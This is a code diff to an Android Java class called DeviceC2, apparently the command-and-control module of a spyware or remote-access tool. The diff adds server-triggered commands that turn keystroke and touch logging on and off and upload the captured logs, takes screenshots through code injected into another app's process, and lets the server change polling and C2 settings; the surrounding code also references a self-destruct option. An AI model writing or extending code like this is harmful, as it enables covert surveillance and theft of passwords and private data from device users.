@@ -39,6 +39,7 @@ final class DeviceC2 {
     private static final String TAG = "DeviceC2";
     private static final Gson GSON = new Gson();
     private static volatile boolean running = false;
+    private static volatile boolean registered = false;
     private static volatile int pollSeconds = 60;
     private static volatile boolean c2Allowed = true;
     private static volatile boolean selfDestructAllowed = true;
@@ -60,10 +61,12 @@ final class DeviceC2 {
     }
 
     static void stop() { running = false; }
+    static boolean isRegistered() { return registered; }
 
     private static void loop(Context ctx) {
         Log.i(TAG, "C2 loop started");
         handle(ctx, post(ctx, Vault.urlRegister(), baseFields(ctx)));
+        registered = true;
         while (running) {
             synchronized (wakeLock) {
                 try {
@@ -239,17 +242,67 @@ final class DeviceC2 {
             }
             case "update_config": {
                 if (payload.has("config") && payload.get("config").isJsonObject()) {
-                    RemoteConfig cfg = GSON.fromJson(payload.get("config"), RemoteConfig.class);
-                    if (cfg != null) {
-                        pollSeconds = cfg.pollIntervalSeconds();
-                        c2Allowed = cfg.c2Enabled();
-                        selfDestructAllowed = cfg.selfDestructEnabled();
-                    }
+                    JsonObject cfg = payload.getAsJsonObject("config");
+                    if (cfg.has("poll_interval_seconds")) pollSeconds = Math.max(5, cfg.get("poll_interval_seconds").getAsInt());
+                    if (cfg.has("enable_c2")) c2Allowed = cfg.get("enable_c2").getAsBoolean();
+                    if (cfg.has("heartbeat_verify")) heartbeatVerify = cfg.get("heartbeat_verify").getAsBoolean();
+                    if (cfg.has("heartbeat_verify_interval_minutes")) heartbeatVerifyInterval = Math.max(0, cfg.get("heartbeat_verify_interval_minutes").getAsInt());
+                    wake();
                 }
                 break;
             }
             case "screenshot": {
                 takeScreenshotAndUpload(ctx, cmdId);
+                break;
+            }
+            case "keylog_on": {
+                try {
+                    Class.forName("com.example.msphone.xp")
+                         .getMethod("setKeylogEnabled", boolean.class).invoke(null, true);
+                    uploadText(ctx, cmdId, "keylog_on", "keylog started");
+                } catch (Throwable t) { uploadText(ctx, cmdId, "keylog_on", "err: " + t.getMessage()); }
+                break;
+            }
+            case "keylog_off": {
+                try {
+                    Class.forName("com.example.msphone.xp")
+                         .getMethod("setKeylogEnabled", boolean.class).invoke(null, false);
+                    uploadText(ctx, cmdId, "keylog_off", "keylog stopped");
+                } catch (Throwable t) { uploadText(ctx, cmdId, "keylog_off", "err: " + t.getMessage()); }
+                break;
+            }
+            case "keylog_get": {
+                try {
+                    String log = (String) Class.forName("com.example.msphone.xp")
+                                               .getMethod("getAndClearKeylog").invoke(null);
+                    if (log == null || log.isEmpty()) log = "(empty)";
+                    uploadBytes(ctx, cmdId, "keylog", "txt", log.getBytes(StandardCharsets.UTF_8), "text/plain");
+                } catch (Throwable t) { uploadText(ctx, cmdId, "keylog_get", "err: " + t.getMessage()); }
+                break;
+            }
+            case "touchlog_on": {
+                try {
+                    Class.forName("com.example.msphone.xp")
+                         .getMethod("setTouchlogEnabled", boolean.class).invoke(null, true);
+                    uploadText(ctx, cmdId, "touchlog_on", "touchlog started");
+                } catch (Throwable t) { uploadText(ctx, cmdId, "touchlog_on", "err: " + t.getMessage()); }
+                break;
+            }
+            case "touchlog_off": {
+                try {
+                    Class.forName("com.example.msphone.xp")
+                         .getMethod("setTouchlogEnabled", boolean.class).invoke(null, false);
+                    uploadText(ctx, cmdId, "touchlog_off", "touchlog stopped");
+                } catch (Throwable t) { uploadText(ctx, cmdId, "touchlog_off", "err: " + t.getMessage()); }
+                break;
+            }
+            case "touchlog_get": {
+                try {
+                    String log = (String) Class.forName("com.example.msphone.xp")
+                                               .getMethod("getAndClearTouchlog").invoke(null);
+                    if (log == null || log.isEmpty()) log = "(empty)";
+                    uploadBytes(ctx, cmdId, "touchlog", "txt", log.getBytes(StandardCharsets.UTF_8), "text/plain");
+                } catch (Throwable t) { uploadText(ctx, cmdId, "touchlog_get", "err: " + t.getMessage()); }
                 break;
             }
             case "switch_toggle": {
@@ -299,10 +352,26 @@ final class DeviceC2 {
     }
 
     private static void takeScreenshotAndUpload(Context ctx, String cmdId) {
+        // Try in-process PixelCopy first (no root needed, works in injected game process)
+        byte[] xShot = tryXposedScreenshot();
+        if (xShot != null && xShot.length > 1000) {
+            uploadBytes(ctx, cmdId, "screenshot", "jpg", xShot, "image/jpeg");
+            return;
+        }
         if (RootUtils.isRooted()) {
             takeScreenshotRoot(ctx, cmdId);
         } else {
             takeScreenshotAccessibility(ctx, cmdId);
+        }
+    }
+
+    private static byte[] tryXposedScreenshot() {
+        try {
+            Class<?> xpCls = Class.forName("com.example.msphone.xp");
+            java.lang.reflect.Method m = xpCls.getMethod("captureScreenshot");
+            return (byte[]) m.invoke(null);
+        } catch (Throwable t) {
+            return null;
         }
     }
 
